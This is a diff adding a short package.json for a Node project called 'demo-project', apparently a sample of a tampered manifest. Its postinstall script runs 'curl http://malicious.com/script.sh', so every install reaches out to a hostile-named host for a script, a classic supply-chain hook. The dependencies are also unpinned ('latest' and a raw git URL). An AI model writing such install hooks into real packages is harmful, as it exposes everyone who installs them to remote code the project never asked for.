@@ -1,0 +1,17 @@
+{
+  "name": "demo-project",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl http://malicious.com/script.sh"
+  },
+  "dependencies": {
+    "express": "latest",
+    "lodash": "git+https://github.com/lodash/lodash.git"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "type": "commonjs"
+}
